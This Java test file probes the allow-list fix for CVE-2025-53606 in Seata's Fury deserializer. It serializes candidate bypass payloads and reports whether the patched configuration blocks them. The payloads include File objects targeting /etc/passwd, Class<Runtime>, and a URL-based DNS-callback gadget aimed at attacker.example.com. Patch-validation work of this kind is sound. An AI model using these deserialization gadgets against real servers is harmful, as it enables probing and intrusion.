/**
 * CVE-2025-53606 Bypass Analysis Test
 *
 * Tests multiple bypass vectors against the AllowListChecker fix in Seata 2.5.0.
 * This runs inside the container's JVM with the actual Fury/Seata JARs to get
 * precise results about what the AllowListChecker blocks or allows.
 *
 * Bypass Vectors Tested:
 * 1. Direct non-whitelisted class (confirm blocked)
 * 2. Whitelisted HashMap with Seata class keys
 * 3. Array type bypass (arrays of non-whitelisted types)
 * 4. Inner class bypass ($-notation classes)
 * 5. java.lang.Class type abuse
 * 6. Whitelisted Seata class field manipulation
 * 7. Nested container bypass (HashMap inside HashMap)
 * 8. Primitive wrapper abuse
 */

import org.apache.fury.Fury;
import org.apache.fury.ThreadLocalFury;
import org.apache.fury.ThreadSafeFury;
import org.apache.fury.config.CompatibleMode;
import org.apache.fury.config.Language;
import org.apache.fury.resolver.AllowListChecker;
import org.apache.fury.resolver.ClassResolver;

import java.io.File;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.*;
import java.util.concurrent.atomic.AtomicInteger;

public class BypassTest {

    // Recreate the EXACT patched server configuration
    private static Fury createPatchedFury() {
        Fury f = Fury.builder()
                .withLanguage(Language.JAVA)
                .requireClassRegistration(false)
                .withRefTracking(true)
                .withCompatibleMode(CompatibleMode.COMPATIBLE)
                .build();

        // This is exactly what the patched FurySerializerFactory does
        AllowListChecker checker = new AllowListChecker(AllowListChecker.CheckLevel.STRICT);
        f.getClassResolver().setClassChecker(checker);

        // These are the exact patterns from SerializerSecurityRegistry.getAllowClassPattern()
        Set<String> allowPatterns = new HashSet<>();
        // Basic types
        allowPatterns.add("java.lang.Boolean");
        allowPatterns.add("java.lang.Byte");
        allowPatterns.add("java.lang.Character");
        allowPatterns.add("java.lang.Double");
        allowPatterns.add("java.lang.Float");
        allowPatterns.add("java.lang.Integer");
        allowPatterns.add("java.lang.Long");
        allowPatterns.add("java.lang.Short");
        allowPatterns.add("java.lang.Number");
        allowPatterns.add("java.lang.Class");
        allowPatterns.add("java.lang.String");
        // Collection types
        allowPatterns.add("java.util.ArrayList");
        allowPatterns.add("java.util.LinkedList");
        allowPatterns.add("java.util.HashSet");
        allowPatterns.add("java.util.LinkedHashSet");
        allowPatterns.add("java.util.TreeSet");
        allowPatterns.add("java.util.HashMap");
        allowPatterns.add("java.util.LinkedHashMap");
        allowPatterns.add("java.util.TreeMap");
        // Seata wildcard
        allowPatterns.add("org.apache.seata.*");
        // Protocol inner fields
        allowPatterns.add("org.apache.seata.core.exception.TransactionExceptionCode");
        allowPatterns.add("org.apache.seata.core.model.BranchStatus");
        allowPatterns.add("org.apache.seata.core.model.BranchType");
        allowPatterns.add("org.apache.seata.core.model.GlobalStatus");
        allowPatterns.add("org.apache.seata.core.protocol.ResultCode");

        checker.allowClasses(allowPatterns);

        return f;
    }

    // Unrestricted fury for generating payloads (attacker side)
    private static Fury createAttackerFury() {
        return Fury.builder()
                .withLanguage(Language.JAVA)
                .requireClassRegistration(false)
                .withRefTracking(true)
                .withCompatibleMode(CompatibleMode.COMPATIBLE)
                .build();
    }

    private static void testBypass(String name, Object payload) {
        Fury attacker = createAttackerFury();
        Fury patched = createPatchedFury();

        System.out.println("\n=== TEST: " + name + " ===");
        System.out.println("  Payload class: " + payload.getClass().getName());

        try {
            // Serialize with attacker's unrestricted fury
            byte[] serialized = attacker.serialize(payload);
            System.out.println("  Serialized: " + serialized.length + " bytes");

            // Try to deserialize with patched fury
            try {
                Object result = patched.deserialize(serialized);
                System.out.println("  >>> BYPASS SUCCESSFUL! Deserialized: " + result);
                System.out.println("  >>> Result class: " + result.getClass().getName());
                if (result instanceof Map) {
                    Map<?, ?> map = (Map<?, ?>) result;
                    System.out.println("  >>> Map size: " + map.size());
                    for (Map.Entry<?, ?> e : map.entrySet()) {
                        System.out.println("  >>> Key: " + e.getKey() + " (class: " +
                            (e.getKey() != null ? e.getKey().getClass().getName() : "null") + ")");
                        System.out.println("  >>> Value: " + e.getValue() + " (class: " +
                            (e.getValue() != null ? e.getValue().getClass().getName() : "null") + ")");
                    }
                }
            } catch (Exception e) {
                String msg = e.getMessage();
                if (msg == null) msg = e.getClass().getName();
                // Check for InsecureException (AllowListChecker blocking)
                if (msg.contains("isn't in allow list") || msg.contains("is forbidden") ||
                    e.getClass().getName().contains("InsecureException")) {
                    System.out.println("  BLOCKED by AllowListChecker: " + msg.substring(0, Math.min(msg.length(), 200)));
                } else {
                    System.out.println("  FAILED with different error: " + e.getClass().getName() + ": " + msg.substring(0, Math.min(msg.length(), 200)));
                }
            }
        } catch (Exception e) {
            System.out.println("  SERIALIZATION FAILED: " + e.getClass().getName() + ": " + e.getMessage());
        }
    }

    public static void main(String[] args) throws Exception {
        System.out.println("========================================================================");
        System.out.println("CVE-2025-53606 Bypass Analysis");
        System.out.println("Testing AllowListChecker bypass vectors against patched configuration");
        System.out.println("========================================================================");

        // =================================================================
        // Vector 1: Confirm non-whitelisted class is blocked (baseline)
        // =================================================================
        testBypass("V1-BASELINE: Non-whitelisted java.io.File (should be BLOCKED)",
            new File("/etc/passwd"));

        // =================================================================
        // Vector 2: Confirm non-whitelisted java.net.URL is blocked
        // =================================================================
        try {
            HashMap<URL, String> urlMap = new HashMap<>();
            URL url = new URL("http://attacker.example.com/bypass");
            Field hf = URL.class.getDeclaredField("hashCode");
            hf.setAccessible(true);
            hf.set(url, -1);
            urlMap.put(url, "test");
            testBypass("V2-BASELINE: HashMap<URL,String> DNS callback (should be BLOCKED)", urlMap);
        } catch (Exception e) {
            System.out.println("  Setup failed: " + e);
        }

        // =================================================================
        // Vector 3: HashMap<String, String> (all whitelisted - should pass)
        // =================================================================
        HashMap<String, String> safeMap = new HashMap<>();
        safeMap.put("key1", "value1");
        safeMap.put("key2", "value2");
        testBypass("V3-SAFE: HashMap<String,String> (should be ALLOWED)", safeMap);

        // =================================================================
        // Vector 4: HashMap<Integer, String> (both whitelisted)
        // =================================================================
        HashMap<Integer, String> intMap = new HashMap<>();
        intMap.put(42, "value");
        intMap.put(1337, "exploit");
        testBypass("V4-SAFE: HashMap<Integer,String> (should be ALLOWED)", intMap);

        // =================================================================
        // Vector 5: Try ArrayList<File> - ArrayList whitelisted, File is not
        // =================================================================
        ArrayList<File> fileList = new ArrayList<>();
        fileList.add(new File("/etc/passwd"));
        testBypass("V5-NESTED: ArrayList<File> (ArrayList allowed, File not)", fileList);

        // =================================================================
        // Vector 6: HashMap<String, File> - key whitelisted, value not
        // =================================================================
        HashMap<String, File> fileValueMap = new HashMap<>();
        fileValueMap.put("target", new File("/etc/passwd"));
        testBypass("V6-NESTED: HashMap<String,File> (key allowed, value not)", fileValueMap);

        // =================================================================
        // Vector 7: Nested HashMap<String, HashMap<URL, String>>
        // =================================================================
        try {
            HashMap<URL, String> innerMap = new HashMap<>();
            URL url = new URL("http://attacker.example.com/nested");
            Field hf = URL.class.getDeclaredField("hashCode");
            hf.setAccessible(true);
            hf.set(url, -1);
            innerMap.put(url, "nested");
            HashMap<String, HashMap<URL, String>> nestedMap = new HashMap<>();
            nestedMap.put("outer", innerMap);
            testBypass("V7-NESTED: HashMap<String, HashMap<URL,String>> (deep nesting)", nestedMap);
        } catch (Exception e) {
            System.out.println("  Setup failed: " + e);
        }

        // =================================================================
        // Vector 8: Try java.lang.Class object referencing a non-whitelisted class
        // If Class is whitelisted, can we trick Fury into loading the referenced class?
        // =================================================================
        testBypass("V8-CLASS: Class<File> object (java.lang.Class is whitelisted)", File.class);
        testBypass("V8b-CLASS: Class<URL> object", URL.class);
        testBypass("V8c-CLASS: Class<Runtime> object", Runtime.class);

        // =================================================================
        // Vector 9: Array of non-whitelisted type
        // =================================================================
        File[] fileArray = new File[] { new File("/etc/passwd") };
        testBypass("V9-ARRAY: File[] array (array of non-whitelisted type)", (Object)fileArray);

        // =================================================================
        // Vector 10: HashMap with AtomicInteger (non-whitelisted)
        // =================================================================
        HashMap<String, AtomicInteger> atomicMap = new HashMap<>();
        atomicMap.put("count", new AtomicInteger(42));
        testBypass("V10-NESTED: HashMap<String,AtomicInteger>", atomicMap);

        // =================================================================
        // Vector 11: Try whitelisted Number type with non-whitelisted subclass
        // Number is whitelisted, AtomicInteger extends Number
        // =================================================================
        Number num = new AtomicInteger(42);
        testBypass("V11-POLY: Number (actually AtomicInteger)", num);

        // =================================================================
        // Vector 12: Try Object[] with mixed types
        // =================================================================
        Object[] mixed = new Object[] { "safe", new File("/etc/passwd"), 42 };
        testBypass("V12-MIXED: Object[] with mixed types", mixed);

        // =================================================================
        // Vector 13: HashMap<HashMap<String,String>, String>
        // Map inside map key - does hashCode trigger dangerous behavior?
        // =================================================================
        HashMap<HashMap<String, String>, String> mapKeyMap = new HashMap<>();
        HashMap<String, String> innerKey = new HashMap<>();
        innerKey.put("inner", "value");
        mapKeyMap.put(innerKey, "outer");
        testBypass("V13-COMPLEX: HashMap<HashMap<String,String>, String>", mapKeyMap);

        // =================================================================
        // Vector 14: TreeMap with custom comparator idea
        // TreeMap is whitelisted. If we set a custom Comparator that
        // references a non-whitelisted class?
        // =================================================================
        // This would require a Seata-classpath Comparator
        // TreeMap<String, String> with natural ordering is safe

        // =================================================================
        // Vector 15: LinkedList with many elements to check consistency
        // =================================================================
        LinkedList<String> linkedList = new LinkedList<>();
        for (int i = 0; i < 10; i++) linkedList.add("item" + i);
        testBypass("V15-SAFE: LinkedList<String>", linkedList);

        // =================================================================
        // Vector 16: Try inner class notation
        // HashMap$Node, HashMap$TreeNode etc.
        // =================================================================
        // These are handled internally by Fury's Map serialization

        System.out.println("\n========================================================================");
        System.out.println("BYPASS ANALYSIS COMPLETE");
        System.out.println("========================================================================");
    }
}
